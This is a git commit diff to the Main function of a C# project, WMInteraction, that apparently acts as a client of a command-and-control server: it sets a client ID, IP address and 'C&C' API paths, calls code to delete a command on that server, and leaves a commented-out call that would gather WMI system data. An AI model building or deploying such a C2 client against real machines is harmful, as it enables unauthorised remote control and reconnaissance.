a14c06287e66f40f39e59504206735b68d0fc826
NAVNAV221 <navve2008@gmail.com>
2023-09-01 08:15:57 +0300

    Add examples to main function

--- WMInteraction/Program.cs
+++ WMInteraction/Program.cs
@@ -1,6 +1,13 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Management;
+using System;
+using System.Collections.Generic;
+using System.Text;
+using System.Runtime;
+using System.Net.Http;
+using System.Net.Http.Headers;
+using System.Threading.Tasks;
+using Newtonsoft.Json;
 
 namespace WMInteraction
 {
@@ -8,15 +15,34 @@ namespace WMInteraction
     {
         static void Main(string[] args)
         {
-            WMI_component dynamicWMI = new WMI_component("","","");
-            HTTPClient.RunAsync(dynamicWMI).GetAwaiter().GetResult();
+            string wmiActionIdDelete = "10";
+            string client_id = "1236";
+            string ipAddress = "10.10.10.10";
+            string platform = "windows";
+            string c2Uri = "/api/clients/1236/action_status";
+            string username = "username";
 
-            Dictionary<string, Object> wmiProperties = dynamicWMI.RetriveWMIData();
+            // Retrive WMI information about client
+            /*
+             * HTTPClient httpClient = new HTTPClient(client_id, ipAddress, username, platform, c2Uri);
+             * HTTPClient.RunAsync(dynamicWMI, httpClient).GetAwaiter().GetResult();
+             * Dictionary<string, Object> wmiProperties = dynamicWMI.RetriveWMIData();
+             * foreach (KeyValuePair<string, Object> entry in wmiProperties
+             * {
+             *      Console.WriteLine("Key: {0} | Value: {1}", entry.Key, entry.Value);
+             * }
+             * 
+            */
 
-            foreach (KeyValuePair<string, Object> entry in wmiProperties)
-            {
-                Console.WriteLine("Key: {0} | Value: {1}", entry.Key, entry.Value);
-            }
+
+            // Delete Command from C&C server
+            c2Uri = "/api/delete_wmi_action_to_user";
+
+            WMI_component dynamicWMI = new WMI_component("", "", "", wmiActionIdDelete);
+            HTTPClient httpClient = new HTTPClient(client_id, ipAddress, username, platform, c2Uri);
+
+            HTTPClient.DeleteCommand(dynamicWMI, httpClient).GetAwaiter().GetResult();
+
         }
     }
 }
